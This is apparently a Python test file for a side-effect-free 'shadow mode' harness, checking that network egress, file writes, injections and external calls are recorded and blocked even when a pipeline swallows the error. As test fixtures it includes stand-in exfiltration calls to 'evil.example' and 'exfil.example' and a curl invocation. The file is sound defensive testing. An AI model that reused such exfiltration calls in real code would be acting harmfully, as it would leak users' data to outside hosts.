#!/usr/bin/env python3
"""Tests for shadow_harness — Phase 4 bead 4.2: provably side-effect-free shadow mode. Standalone.

Keystone: in shadow mode EVERY side-effecting operation (egress / write / inject / provider_call /
external_call) records the attempt (metadata-only) and raises SideEffectError. Because the attempt is
recorded BEFORE the raise, even a SWALLOWED SideEffectError is caught — a pipeline that tries a side effect
and ignores the error still FAILs the shadow run. A clean (compute-only) pipeline completes with zero
attempts and PASSes.
"""
import io
import json
import sys
from contextlib import redirect_stdout
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

import shadow_harness as sh  # noqa: E402


def test_clean_pipeline_has_no_side_effects():
    def clean(b):
        return {"computed": 1 + 1}  # only computes; never touches the boundary
    rep = sh.run_shadow(clean)
    assert rep["overall_verdict"] == "PASS" and rep["status"] == "no_side_effects"
    assert rep["attempt_count"] == 0


def test_each_side_effecting_op_raises_and_is_recorded():
    ops = [
        ("egress", lambda b: b.egress("https://evil.example", "payload")),
        ("write", lambda b: b.write("/Users/testuser/out.txt", "data")),
        ("inject", lambda b: b.inject("live_session", "ctx")),
        ("provider_call", lambda b: b.provider_call("claude-x", "req")),
        ("external_call", lambda b: b.external_call(["curl", "https://x"])),
    ]
    for action_type, fn in ops:
        rep = sh.run_shadow(fn)
        assert rep["overall_verdict"] == "FAIL", action_type
        assert rep["status"] == "side_effect_attempted"
        assert action_type in rep["attempted_action_types"], action_type


def test_direct_call_raises_side_effect_error():
    b = sh.ShadowBoundary()
    try:
        b.write("/tmp/x", "y")
    except sh.SideEffectError as exc:
        assert exc.action_type == "write"
    else:
        raise AssertionError("expected SideEffectError")


def test_swallowed_side_effect_is_still_caught():
    # the dangerous case: the pipeline TRIES a side effect, swallows the error, and continues
    def sneaky(b):
        for _ in range(3):
            try:
                b.egress("https://exfil.example", "secret")
            except sh.SideEffectError:
                pass  # swallow and keep going
        return {"ok": True}
    rep = sh.run_shadow(sneaky)
    assert rep["overall_verdict"] == "FAIL" and rep["status"] == "side_effect_attempted"
    assert rep["attempt_count"] == 3  # every swallowed attempt was recorded


def test_run_error_is_fail_closed():
    def boom(b):
        raise RuntimeError("pipeline bug")
    rep = sh.run_shadow(boom)
    assert rep["overall_verdict"] == "FAIL" and rep["status"] == "run_error"
    assert rep["error_type"] == "RuntimeError"


def test_attempts_are_metadata_only_hash_not_raw():
    def leaky(b):
        b.write("/Users/testuser/secret-file.txt", "the password is hunter2")
    rep = sh.run_shadow(leaky)
    blob = json.dumps(rep)
    assert "testuser" not in blob and "hunter2" not in blob and "secret-file" not in blob
    assert len(rep["attempts"][0]["summary_sha256_16"]) == 16


def _run_main(argv):
    saved = sys.argv
    sys.argv = ["shadow_harness.py"] + argv
    buf = io.StringIO()
    try:
        with redirect_stdout(buf):
            rc = sh.main()
    finally:
        sys.argv = saved
    return rc, json.loads(buf.getvalue())


def test_main_selftest():
    rc, rep = _run_main(["--selftest", "--pretty"])
    assert rc == 0 and rep["overall_verdict"] == "PASS"
    # the selftest proves a clean run passes AND a violating run is blocked
    assert rep["clean_run"]["overall_verdict"] == "PASS"
    assert rep["violating_run"]["overall_verdict"] == "FAIL"


if __name__ == "__main__":
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_") and callable(v)]
    for fn in tests:
        fn()
        print("PASS", fn.__name__)
    print(f"\nall {len(tests)} shadow_harness tests passed")
